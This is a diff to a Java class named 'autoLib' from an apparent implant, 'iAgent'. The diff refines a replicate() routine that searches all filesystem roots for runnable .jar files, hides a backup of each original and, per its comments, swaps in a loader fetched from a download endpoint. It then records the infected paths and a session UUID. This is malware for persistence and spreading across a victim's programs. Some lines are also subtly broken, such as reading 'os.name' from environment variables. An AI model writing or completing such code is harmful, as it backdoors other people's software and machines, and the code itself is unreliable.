@@ -15,6 +15,8 @@ import java.util.Enumeration;
 import java.util.Hashtable;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
+import java.util.stream.Collectors;
+import java.util.List;
 
 import javax.xml.parsers.ParserConfigurationException;
 import javax.xml.transform.TransformerException;
@@ -46,7 +48,7 @@ public class autoLib
         iAgent.output.add(metaDoc);
     }
 
-    public void replicate(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
+    public void replicate(String[] args) throws IOException, SocketException, UnknownHostException, ParserConfigurationException, TransformerException
     {
         Hashtable<String,String> metadata = new Hashtable<>();
         iAgent.utilitarian nUtil = new iAgent.utilitarian();
@@ -56,14 +58,15 @@ public class autoLib
             ArrayList<File> preRootSet = new ArrayList<>();
             ArrayList<Path> fileNames = new ArrayList();
             File[] roots = File.listRoots();
+            ArrayList<String> listFileNames = new ArrayList();
 
             for (int f=0;f<roots.length;f++)
             {  
                 if (!preRootSet.contains(roots[f].getName()))
                 {
-                    preRootSet.add(roots[f].getName());
+                    preRootSet.add(roots[f]);
                     Files.find(
-                        Paths.get(roots[f]),
+                        Paths.get(roots[f].getName()),
                         Integer.MAX_VALUE,
                         (p, basicFileAttributes) ->
                                 p.getFileName().toString().contains(".jar"))
@@ -73,26 +76,26 @@ public class autoLib
             
             for (int r=0;r<fileNames.size();r++)
             {
-                if (chkMain(fileNames.get(r),nUtil))
+                if (chkJarMain(fileNames.get(r),nUtil))
                 {
                     try
                     {
-                        String jarPath = fileNames.get(r).toString();
+                        File jarFile = (fileNames.get(r).toFile());
                         //check if bak-jarname.jar already exists, if so skip
-                        File file = new File(jarPath);
-                        String parent = file.getParent();
+                        String parent = jarFile.getParent();
                         
-                        String bakJarPath = String.format("%s%s.bak-%s.jar",parent,File.separator,file.getName());
+                        String bakJarPath = String.format("%s%s.bak-%s",parent,File.separator,jarFile.getName());
 
+                        //need to add some logic that precludes the actual jdk jars from getting smashed by this
                         if (!new File(bakJarPath).isFile())
                         {
                             //copy to bak-jarname.jar
-                            Files.copy(file.getAbsolutePath(), bakJarPath, StandardCopyOption.REPLACE_EXISTING);
+                            Files.copy(Paths.get(jarFile.getAbsolutePath()), Paths.get(bakJarPath), StandardCopyOption.REPLACE_EXISTING);
 
                             //hide bak-jarname.jar
                             if (System.getenv("os.name").toLowerCase().contains("win"))
                             {
-                                Files.setAttribute(bakJarPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+                                Files.setAttribute(Paths.get(bakJarPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
                             }
 
                             //create jarname.jar containing loader, downloaded from revamped download endpoint
@@ -104,9 +107,10 @@ public class autoLib
                         fileNames.remove(r);
                     }
                 }
-                //implict else: no main class, ignoring
 
-                metadata.put("persistedPaths",String.join(",",fileNames));
+                //implict else: no main class, ignoring
+                listFileNames.add(fileNames.get(r).toString());
+                metadata.put("persistedPaths",String.join(",",listFileNames));
                 metadata.put("uuid",iAgent.sessUUID);
                 metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                 metadata.put("error","");
@@ -115,6 +119,8 @@ public class autoLib
                 iAgent.output.add(metaDoc);
 
             }
+            
+
         }
     }
 
